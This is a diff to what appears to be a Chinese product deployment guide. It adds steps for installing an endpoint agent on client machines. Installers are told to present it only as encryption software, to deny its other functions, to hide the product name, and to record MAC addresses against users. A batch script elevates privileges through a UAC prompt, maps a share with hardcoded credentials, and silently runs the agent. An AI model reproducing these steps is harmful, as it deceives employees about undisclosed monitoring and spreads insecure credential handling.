@@ -207,24 +207,51 @@ GO
 4
 {% endtab %}
 {% endtabs %}
-
-
-
-
-
-
-
-
-
-
-
-
 {% endstep %}
 
 {% step %}
 ### 确认部署逻辑
 
+{% tabs %}
+{% tab title="有加密" %}
+以加密为主导推进，需要有以下几个步骤
 
+1. 询问客户是否可以更新保密协议，添加如“公司可使用合法的软硬件保护属于公司的信息资产安全”
+2. 对用户安装时，说这是加密软件，会审计加解密文件的日志还有解密文件理由，其他的功能一概说没有。请注意一定不要透露产品名称。
+3. 安装时注意收集MAC地址-使用人员信息，并制成表格，方便后续使用。
+4. 安装时可使用BAT脚本安装，打消用户疑虑，请生成静默安装包。
+
+{% code title="脚本样本，核对好安装包名称和文件路径，并设置好访问账号和密码" overflow="wrap" %}
+```batch
+@echo off
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else (
+    goto gotAdmin
+)
+
+:UACPrompt
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+"%temp%\getadmin.vbs"
+exit /B
+
+:gotAdmin
+if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+
+REM 提供用户凭据连接
+net use \\172.16.200.10\temp /user:temp x123.com
+
+start \\172.16.200.10\temp\agt-c.exe /qn
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="没有加密" %}
+
+{% endtab %}
+{% endtabs %}
 {% endstep %}
 
 {% step %}
